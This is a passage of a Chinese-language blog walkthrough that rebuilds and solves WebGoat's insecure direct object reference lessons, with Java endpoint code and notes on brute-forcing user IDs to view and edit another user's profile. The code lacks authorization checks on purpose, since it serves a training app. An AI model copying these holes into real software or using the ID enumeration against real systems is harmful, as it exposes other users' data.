class="line"><span class="comment">//        将参数通过，进行分割成数组</span></span><br><span class="line">        <span class="keyword">if</span> (diffAttribs.length &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//            如果数组的长度小于2 直接返回错误</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.diff.attributes.missing&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (diffAttribs[<span class="number">0</span>].toLowerCase().trim().equals(<span class="string">&quot;userid&quot;</span>) &amp;&amp; diffAttribs[<span class="number">1</span>].toLowerCase().trim().equals(<span class="string">&quot;role&quot;</span>) ||</span><br><span class="line">        diffAttribs[<span class="number">1</span>].toLowerCase().trim().equals(<span class="string">&quot;userid&quot;</span>) &amp;&amp; diffAttribs[<span class="number">0</span>].toLowerCase().trim().equals(<span class="string">&quot;role&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//        如果数组中第一个值先转换为小写 后去前后空格 接着与userid进行对比 对第二个进行比较如果是role </span></span><br><span class="line"><span class="comment">//            简单来说就是需要前两个是userid</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.diff.success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.diff.failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里写完之后第二关是无法去通过的,因此我们需要接着写</p>
<h3 id="IDORViewOwnProfile"><a href="#IDORViewOwnProfile" class="headerlink" title="IDORViewOwnProfile"></a>IDORViewOwnProfile</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDORViewOwnProfile</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line"><span class="comment">//    这里就是我们之间的全局变量 userSessionData</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &#123;&quot;/IDOR/own&quot;,&quot;/IDOR/profile&quot;&#125;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line"><span class="comment">//    这里很明显示产生了一个json的数据返回回去的</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title function_">invoke</span><span class="params">()</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; details =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (userSessionData.getValue(<span class="string">&quot;idor-authenticated-as&quot;</span>).equals(<span class="string">&quot;tom&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                如果这里已经登录的对象里存在tom</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">authUserId</span>  <span class="operator">=</span> (String) userSessionData.getValue(<span class="string">&quot;idor-authenticated-user-id&quot;</span>);</span><br><span class="line"><span class="comment">//                就取出这个id来</span></span><br><span class="line">                <span class="type">UserProfile</span> <span class="variable">userProfile</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">UserProfile</span>(authUserId);</span><br><span class="line"><span class="comment">//                通过这个id 去创建一个UserProfile 这个类是一个数据类</span></span><br><span class="line">                details.put(<span class="string">&quot;userId&quot;</span>,userProfile.getUserId());</span><br><span class="line">                details.put(<span class="string">&quot;name&quot;</span>,userProfile.getName());</span><br><span class="line">                details.put(<span class="string">&quot;color&quot;</span>,userProfile.getColor());</span><br><span class="line">                details.put(<span class="string">&quot;size&quot;</span>,userProfile.getSize());</span><br><span class="line">                details.put(<span class="string">&quot;role&quot;</span>,userProfile.getRole());</span><br><span class="line"><span class="comment">//                在详情里放入这些值 然后返回回去</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                details.put(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;You do not have privileges to view the profile. Authenticate as tom first please.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;something went wrong&quot;</span>,ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> details;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="UserProfile"><a href="#UserProfile" class="headerlink" title="UserProfile"></a>UserProfile</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProfile</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String userId;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line">    <span class="keyword">private</span> String size;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isAdmin;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> role;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProfile</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProfile</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        setProfileFromId(id);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    这里的构造函数是仅仅提供了一个id去创建</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setProfileFromId</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (id.equals(<span class="string">&quot;2342384&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">this</span>.userId = id;</span><br><span class="line">            <span class="built_in">this</span>.color = <span class="string">&quot;yellow&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.name = <span class="string">&quot;Tom Cat&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.size = <span class="string">&quot;small&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">this</span>.role = <span class="number">3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (id.equals(<span class="string">&quot;2342388&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">this</span>.userId = id;</span><br><span class="line">            <span class="built_in">this</span>.color = <span class="string">&quot;brown&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.name = <span class="string">&quot;Buffalo Bill&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.size = <span class="string">&quot;large&quot;</span>;</span><br><span class="line">            <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">this</span>.role = <span class="number">3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title function_">profileToMap</span><span class="params">()</span>&#123;</span><br><span class="line">        Map&lt;String ,Object&gt; profileMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        profileMap.put(<span class="string">&quot;userId&quot;</span>,<span class="built_in">this</span>.userId);</span><br><span class="line">        profileMap.put(<span class="string">&quot;name&quot;</span>,<span class="built_in">this</span>.name);</span><br><span class="line">        profileMap.put(<span class="string">&quot;color&quot;</span>,<span class="built_in">this</span>.color);</span><br><span class="line">        profileMap.put(<span class="string">&quot;role&quot;</span>,<span class="built_in">this</span>.role);</span><br><span class="line">        <span class="keyword">return</span> profileMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toHTMLString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">htmlBreak</span> <span class="operator">=</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userId&quot;</span> + <span class="built_in">this</span>.userId + htmlBreak +</span><br><span class="line">                <span class="string">&quot;name&quot;</span> + <span class="built_in">this</span>.name + htmlBreak +</span><br><span class="line">                <span class="string">&quot;size&quot;</span> + <span class="built_in">this</span>.size + htmlBreak +</span><br><span class="line">                <span class="string">&quot;role&quot;</span> + <span class="built_in">this</span>.role + htmlBreak +</span><br><span class="line">                <span class="string">&quot;isAdmin&quot;</span> + <span class="built_in">this</span>.isAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserId</span><span class="params">(String userId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userId = userId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getColor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setColor</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSize</span><span class="params">(String size)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.size = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAdmin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAdmin</span><span class="params">(<span class="type">boolean</span> admin)</span> &#123;</span><br><span class="line">        isAdmin = admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getRole</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> role;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRole</span><span class="params">(<span class="type">int</span> role)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.role = role;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831180320323.png" alt="image-20220831180320323"></p>
<p>首先这里存在一个view profile 用于查看资料,但是这个资料的查看前提是需要在第二关登录才能查看的</p>
<p>这里的UserProfile 就很像一个数据类 专门用来封装数据的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831181411408.png" alt="image-20220831181411408"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831182021822.png" alt="image-20220831182021822"></p>
<p>那么这里以,分割填入userid和role就可以了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831182633882.png" alt="image-20220831182633882"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831184322783.png" alt="image-20220831184322783"></p>
<h3 id="IDORViewOwnProfileAltUrl"><a href="#IDORViewOwnProfileAltUrl" class="headerlink" title="IDORViewOwnProfileAltUrl"></a>IDORViewOwnProfileAltUrl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.parameters.P;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;idor.hints.ownProfileAltUrl1&quot;,&quot;idor.hints.ownProfileAltUrl2&quot;,&quot;idor.hints.ownProfileAltUrl3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDORViewOwnProfileAltUrl</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line"><span class="comment">//    获取seesion对象</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/IDOR/profile/alt-path&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span>&#123;</span><br><span class="line"><span class="comment">//        获取请求参数url</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (userSessionData.getValue(<span class="string">&quot;idor-authenticated-as&quot;</span>).equals(<span class="string">&quot;tom&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                确认是否是tom登录了</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">authUserId</span> <span class="operator">=</span> (String) userSessionData.getValue(<span class="string">&quot;idor-authenticated-user-id&quot;</span>);</span><br><span class="line"><span class="comment">//                获取id</span></span><br><span class="line">                String[] urlParts = url.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="comment">//                根据/进行分割</span></span><br><span class="line">                <span class="keyword">if</span> (urlParts[<span class="number">0</span>].equals(<span class="string">&quot;WebGoat&quot;</span>)&amp;&amp;urlParts[<span class="number">1</span>].equals(<span class="string">&quot;IDOR&quot;</span>)&amp;&amp;urlParts[<span class="number">2</span>].equals(<span class="string">&quot;profile&quot;</span>)&amp;&amp;urlParts[<span class="number">3</span>].equals(authUserId))&#123;</span><br><span class="line"><span class="comment">//                    分别按WebGoat IDOR profile进行对比</span></span><br><span class="line">                    <span class="type">UserProfile</span> <span class="variable">userProfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProfile</span>(authUserId);</span><br><span class="line"><span class="comment">//                    创建一个用户</span></span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.view.own.profile.success&quot;</span>).output(userProfile.profileToMap().toString()).build();</span><br><span class="line"><span class="comment">//                    先转换成数组后进行输出</span></span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.view.own.profile.failure1&quot;</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.view.own.profile.failure2&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;an error occurred with your request&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190232238.png" alt="image-20220831190232238"></p>
<p>这里就是像让我们访问个人资料的路径 也是需要先登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190318579.png" alt="image-20220831190318579"></p>
<p>获取路径 和 id</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190748849.png" alt="image-20220831190748849"></p>
<p>这里需要注意的是需要加上这个id</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831190931522.png" alt="image-20220831190931522"></p>
<h3 id="IDORViewOtherProfile"><a href="#IDORViewOtherProfile" class="headerlink" title="IDORViewOtherProfile"></a>IDORViewOtherProfile</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;idor.hints.otherProfile1&quot;, &quot;idor.hints.otherProfile2&quot;, &quot;idor.hints.otherProfile3&quot;, &quot;idor.hints.otherProfile4&quot;, &quot;idor.hints.otherProfile5&quot;, &quot;idor.hints.otherProfile6&quot;, &quot;idor.hints.otherProfile7&quot;, &quot;idor.hints.otherProfile8&quot;, &quot;idor.hints.otherProfile9&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDORViewOtherProfile</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line"><span class="comment">//    session对象</span></span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/IDOR/profile/&#123;userId&#125;&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> String userId, HttpServletResponse response)</span>&#123;</span><br><span class="line"><span class="comment">//        获取路径中的userId参数</span></span><br><span class="line">        Map&lt;String,Object&gt; details = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (userSessionData.getValue(<span class="string">&quot;idor-authenticated-as&quot;</span>).equals(<span class="string">&quot;tom&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//      tom登录</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">authUserId</span> <span class="operator">=</span> (String) userSessionData.getValue(<span class="string">&quot;idor-authenticated-user-id&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (userId != <span class="literal">null</span> &amp;&amp; !userId.equals(authUserId))&#123;</span><br><span class="line"><span class="comment">//                id和认证id一样</span></span><br><span class="line">                <span class="type">UserProfile</span> <span class="variable">requestedProfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProfile</span>(userId);</span><br><span class="line">                <span class="keyword">if</span> (requestedProfile.getUserId().equals(<span class="string">&quot;2342388&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                    bill 这里要注意了哦 这里的id是 bill的</span></span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.view.profile.success&quot;</span>).output(requestedProfile.profileToMap().toString()).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.view.profile.close1&quot;</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.view.profile.close2&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201227028.png" alt="image-20220831201227028"></p>
<p>这里可以看见,这个userid其实是没有赋值的,那么这里呢我们就需要去登录这个 bill 这里的意思也是比较简单,那么假设我们不知道bill的id怎么取访问呢? 爆破id呗</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201436234.png" alt="image-20220831201436234"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201903110.png" alt="image-20220831201903110"></p>
<p>这里为了方便就直接减少点了 并且开了两个线程 不然一直访问500</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220831201854428.png" alt="image-20220831201854428"></p>
<h3 id="IDOREditOtherProfiile"><a href="#IDOREditOtherProfiile" class="headerlink" title="IDOREditOtherProfiile"></a>IDOREditOtherProfiile</h3><p>注意这里的代码与原先的差异</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220901131309653.png" alt="image-20220901131309653"></p>
<p>这里的提示返回的是fail 但是调用的是succes 不知道是不是原文写错了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.parameters.P;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;idor.hints.otherProfile1&quot;, &quot;idor.hints.otherProfile2&quot;, &quot;idor.hints.otherProfile3&quot;, &quot;idor.hints.otherProfile4&quot;, &quot;idor.hints.otherProfile5&quot;, &quot;idor.hints.otherProfile6&quot;, &quot;idor.hints.otherProfile7&quot;, &quot;idor.hints.otherProfile8&quot;, &quot;idor.hints.otherProfile9&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDOREditOtherProfiile</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserSessionData userSessionData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    获取session 对象</span></span><br><span class="line">    <span class="meta">@PutMapping(path = &quot;/IDOR/profile/&#123;userId&#125;&quot;, consumes = &quot;application/json&quot;)</span></span><br><span class="line"><span class="comment">//    注意这里是put请求 并且传入是json格式的文件</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> String userId, <span class="meta">@RequestBody</span> UserProfile userSubmittedProfile)</span> &#123;</span><br><span class="line"><span class="comment">//        这里传入的body是 UserProfile 类的json对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">authUserId</span> <span class="operator">=</span> (String) userSessionData.getValue(<span class="string">&quot;idor-authenticated-user-id&quot;</span>);</span><br><span class="line">        <span class="type">UserProfile</span> <span class="variable">currentUserProfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserProfile</span>(userId);</span><br><span class="line"><span class="comment">//        创建一个UserProfile</span></span><br><span class="line">        <span class="keyword">if</span> (userSubmittedProfile.getUserId() != <span class="literal">null</span> &amp;&amp; !userSubmittedProfile.getUserId().equals(authUserId) ) &#123;</span><br><span class="line"><span class="comment">//          如果id不等于提交的</span></span><br><span class="line">            currentUserProfile.setColor(userSubmittedProfile.getColor());</span><br><span class="line">            currentUserProfile.setRole(userSubmittedProfile.getRole());</span><br><span class="line"><span class="comment">//            设置两个值</span></span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;idor-updated-other-profile&quot;</span>, currentUserProfile);</span><br><span class="line"><span class="comment">//            这里添加一个session</span></span><br><span class="line">            <span class="keyword">if</span> (currentUserProfile.getRole() &lt;= <span class="number">1</span> &amp;&amp; currentUserProfile.getColor().toLowerCase().equals(<span class="string">&quot;red&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//                如果得到的角色 是 &lt;=1的数 并且当前用户的color 是 red</span></span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor-edit.profile.success1&quot;</span>)</span><br><span class="line">                        .output(currentUserProfile.profileToMap().toString())</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentUserProfile.getRole() &gt; <span class="number">1</span> &amp;&amp; currentUserProfile.getColor().toLowerCase().equals(<span class="string">&quot;red&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//              如果得到role &gt; 1 并且 当前用户时red</span></span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;idor.edit.profile.failure1&quot;</span>)</span><br><span class="line">                        .output(currentUserProfile.profileToMap().toString())</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (currentUserProfile.getRole() &lt;= <span class="number">1</span> &amp;&amp; !currentUserProfile.getColor().toLowerCase().equals(<span class="string">&quot;red&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">//                如果得到role &lt;= 1 并且 当前用户时不是red</span></span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                        .feedback(<span class="string">&quot;idor.edit.profile.failure2&quot;</span>)</span><br><span class="line">                        .output(currentUserProfile.profileToMap().toString())</span><br><span class="line">                        .build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;idor.edit.profile.failure3&quot;</span>)</span><br><span class="line">                    